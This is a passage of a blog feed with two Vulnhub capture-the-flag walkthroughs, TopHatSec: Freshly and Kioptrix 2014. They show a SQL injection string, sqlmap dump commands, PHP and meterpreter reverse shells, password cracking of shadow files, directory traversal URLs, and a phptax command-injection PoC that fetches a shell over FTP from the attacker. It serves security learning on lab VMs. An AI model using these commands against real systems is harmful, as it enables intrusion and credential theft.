<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/">here</a>.</p>

<h2>Links</h2>

<p>watch video online:
<iframe src='http://player.vimeo.com/video/130604105?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: TopHatSec: Freshly (<em>10.10.10.134/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>login.php - SQL Injection Vulnerability</li>
<li>weak/same passwords used</li>
<li>/etc/shadow file world readable</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Web information gathering and interacting with the web server [firefox]</li>
<li>Web application scanned to dig more information about web service [nikto]</li>
<li>Exploit SQL injection vulnerability and dump wordpress admin password [sqlmap]</li>
<li>Upload PHP reverse shell and read /etc/passwd and /etc/shadow to greb sensitive information</li>
<li>Use john the ripper for brute-force cracking to get root&rsquo;s password</li>
<li>Generate and upload Linux meterpreter reverse shell and login as root with cracked password</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address and then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 80, 443 and 8080 have been discovered and the web server is apache 2.4.7 running on Ubuntu Linux.</p>

<p>Due to only web services are found, I decided to use <em>nikto</em> firstly to dig more information on port 80 and got the following result:</p>

<p><img class="left" src="/downloads/freshly/1.png"></p>

<p>An login page has been found by <em>nikto</em> and I access <code>http://10.10.10.134/login.php</code> on firefox, it shows a login form with username and password input box.</p>

<p>Simply try some weak passwords such as <code>admin/admin</code> and get <code>0</code> responded which means login failed.</p>

<p>Then I tested simple SQL injection statements such as <code>' or 1=1 -- -</code> in username box and anything in password box, this time the server response <code>1</code> which means login successful.</p>

<p>Based on the test result, I know here is SQL injection vulnerability.</p>

<p>Now fire up <em>SQLMAP</em> to exploit it automatically.</p>

<p><code>sqlmap --url "http://10.10.10.134/login.php" --data "user=1*&amp;password=1&amp;s=Submit" --dbs</code></p>

<p><img class="left" src="/downloads/freshly/2.png"></p>

<p><code>sqlmap --url "http://10.10.10.134/login.php" --data "user=1*&amp;password=1&amp;s=Submit" --smart --batch --dump -T users -D wordpress8080</code></p>

<p><img class="left" src="/downloads/freshly/3.png"></p>

<p>Here we are, the wordpress admin credential has been dumped:</p>

<p><font color="red">admin / SuperSecretPassword</font></p>

<p>Next, modify the pentestmonkey&rsquo;s PHP reverse shell&#8217; IP and port to my Kali&rsquo;s port 5555 and setup NC to listen on this port.</p>

<p>Then by using the collected admin credential, I successfully logged in wordpress dashboard on server&rsquo;s port 8080.</p>

<p>Then go to <code>Appearance --&gt; Editor --&gt; function.php</code>, delete all the content and paste the reverse shell&rsquo;s php code before &ldquo;Update File&rdquo;</p>

<p>Now we got a shell with limited privilege. After poking around the file system, I read the passwd file which the secrets saved in the file too. Surprisingly, the shadow file also can be read.</p>

<p>So dump the passwd and shadow file to my kali and add all found passwords (<em>SuperSecretPassword</em>) into the dictionary file (I use <em>rockyou.txt</em> here)</p>

<p>Then use <em>john the ripper</em> to crack the hashes and got the following result:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo &ldquo;SuperSecretPassword&rdquo; > ~/tmp/dict.txt
</span><span class='line'>cat /usr/share/wordlists/rockyou.txt >> ~/tmp/dict.txt
</span><span class='line'>unshadow passwd.txt shadow.txt > unshadow.txt
</span><span class='line'>john unshadow.txt &ndash;wordlist=~/tmp/dict.txt</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/freshly/4.png"></p>

<p>Bingo! the root user use the same password as wordpress admin.</p>

<p>In the meantime of cracking the passwords, I create and upload linux meterpreter reverse shell (<em>lmp443</em>) to target server in order to get a better interactive shell.</p>

<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.131 LPORT=443 -f elf &gt; /var/www/lmp443</code></p>

<p>Then set up Metasploit on my Kali to use exploit <code>php/meterpreter/reverse_tcp</code> and listen on port <code>443</code></p>

<p>Then trigger the shell and get a meterpreter shell back to my Kali. Finally, use <code>su</code> command with cracked root password to get ROOT.</p>

<p><img class="left" src="/downloads/freshly/5.png"></p>

<h2>Appendix</h2>

<p><strong>All passwords found/cracked:</strong></p>

<p><strong>Wordpress password:</strong></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>admin / SuperSecretPassword</span></code></pre></td></tr></table></div></figure></p>

<p><strong>login.php password:</strong></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>candyshop / password
</span><span class='line'>Sir / PopRocks</span></code></pre></td></tr></table></div></figure></p>

<p><strong>MySQL password:</strong></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root / SuperSecretPassword</span></code></pre></td></tr></table></div></figure></p>

<p><strong>User password:</strong></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root / SuperSecretPassword
</span><span class='line'>user / SuperSecretPassword
</span><span class='line'>candycane / password</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub] Kioptrix 2014]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/25/vulnhub-kioptrix-2014/"/>
    <updated>2015-05-25T00:54:33-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/25/vulnhub-kioptrix-2014</id>
    <content type="html"><![CDATA[<p>This is probably the last/final version of Kioptrix challenge VM, after played with all of those well designed vulnerable boxes, I would say they are challenging and enjoyable, not only for juniors like me :) but also the Pen tester pros will make fun from them. Cheers to <strong><em>loneferret</em></strong> and <strong><em>haken29a</em></strong>.</p>

<p>So back to Kioptrix 2014, more details can be found in this vulnhub website <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">link</a>, which including VM download links, walkthroughs, bug fixes (highly recommended to read Description when first running the VM) and blah blah blah &hellip;</p>

<h2>Links</h2>

<p>watch video online:
<iframe src='http://player.vimeo.com/video/128762761?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Kioptrix 2014 (<em>10.10.10.132/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li><a href="https://www.exploit-db.com/exploits/21665/">phptax 0.8 - Remote Code Execution Vulnerability</a></li>
<li><a href="https://www.exploit-db.com/exploits/31173/">pChart2.1.3 Directory Traversal Vulnerability</a></li>
<li><a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a></li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Web information gathering and interacting with the web server [firefox, wappalyzer addon]</li>
<li>Exploit Remote Code Execution and upload reverse php webshell [php-reverse-shell]</li>
<li>Exploit local privilege escalation to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>I use netdiscover as routine to detect the target&rsquo;s IP address and then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 80 and 8080 have been discovered and the web server is <font color="red">apache 2.2.21</font> running on <font color="red">FreeBSD system</font>.</p>

<p>Fire up NIKTO for web scanning but did not get much interesting results. Trying to access port 8080 from my FIREFOX browser but the access has been forbidden. So I turn to access port 80 on firefox. This time, it shows classic &ldquo;It works!&rdquo; page. After checking the source code, I found something interesting(hidden URL) in comments:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;!--  &lt;META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">  -->
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure>
Looks like web application &ldquo;pChart version 2.1.3&rdquo; is running, so I searched &ldquo;pChart2.1.3 exploit&rdquo; in google and found &ldquo;<a href="https://www.exploit-db.com/exploits/31173/">Directory Traversal and Reflected XSS Vulnerability</a>&rdquo;.</p>

<p>By exploiting the &ldquo;Directory Traversal&rdquo; vulnerability, I can read some system files, such as <code>/etc/passwd</code> and apache configuration file <code>/usr/local/etc/apache22/httpd.conf</code> (note: this is <a href="https://www.freebsd.org/doc/handbook/network-apache.html">apache configuration file location in FreeBSD</a>, which is different from other Linux systems)</p>

<p>PoC:</p>

<p><code>http://10.10.10.132/pChart2.1.3/examples/index.php?Action=View&amp;Script=../../../../../../../etc/passwd</code></p>

<p><code>http://10.10.10.132/pChart2.1.3/examples/index.php?Action=View&amp;Script=../../../../../../../usr/local/etc/apache22/httpd.conf</code></p>

<p>From apache configuration file, I found the following configuration in the end of the file:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="ni">&amp;lt;</span>VirtualHost *:8080&gt;
</span><span class='line'>    DocumentRoot /usr/local/www/apache22/data2<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span><span class="ni">&amp;lt;</span>Directory &quot;/usr/local/www/apache22/data2&quot;&gt;
</span><span class='line'>    Options Indexes FollowSymLinks
</span><span class='line'>    AllowOverride All
</span><span class='line'>    Order allow,deny
</span><span class='line'>    Allow from env=Mozilla4_browser
</span><span class='line'><span class="nt">&lt;/Directory&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here is the key to open port 8080, I changed the user-agent header to <code>Mozilla/4.0</code> (anything start with this string should bypass) by using Firefox addons <a href="https://addons.mozilla.org/En-us/firefox/addon/user-agent-switcher/">User Agent Switcher</a>.</p>

<p>After access 8080 again with new User-Agent Header, I found the web application &ldquo;phptax&rdquo; in URL: <code>http://10.10.10.132:8080/phptax/</code>. Then I searched &ldquo;phptax exploit&rdquo; in google and found the <a href="https://www.exploit-db.com/exploits/21665/">Remote Code Execution vulnerability</a>.</p>

<p>Due to this is FreeBSD system (the OSCP studying experences very helpful here :P), the nc reverse shell could not work, so I have to find other ways. I set up <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a> and FTP server on my Kali, then exploit remote code execution vulnerability to upload my php reverse shell (sh.php) to the target.</p>

<p>PoC:</p>

<p><code>http://10.10.10.132:8080/phptax/index.php?pfilez=1040d1-pg2.tob;ftp -4 -d -v ftp://offsec:offsec@10.10.10.131//sh.php;&amp;pdf=make</code></p>

<p>* <font color="red">Note</font>: There are other methods can be used to upload php reverse shell, for example, using NC. Please check other walkthroughs from the vulnhub <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/#walkthrough">link</a></p>

<p>Then I set up NC to listen on port 5555 and access the URL <code>http://10.10.10.132:8080/phptax/sh.php</code> to trigger the reverse shell connect back to my NC.</p>

<p><img class="left" src="/downloads/kioptrix2014/1.png"></p>

<p>* <font color="red">Note</font>: Metasploit framework also provides an automatic exploit method: &ldquo;<strong><em>exploit/multi/http/phptax_exec</em></strong>&rdquo;</p>

<p><img class="left" src="/downloads/kioptrix2014/2.png"></p>

<p>Now, I have already got in with limited privilege. After some local enumeration, I searched &ldquo;freebsd 9 exploit&rdquo; in google and found two working exploits:</p>

<ul>
<li><a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a></li>
</ul>


<p>After upload any one of the exploits, compiled with gcc and run it to get ROOT.</p>

<p><img class="left" src="/downloads/kioptrix2014/3.png"></p>

<p><img class="left" src="/downloads/kioptrix2014/4.png"></p>
]]></content>
  </entry>
  
</feed>
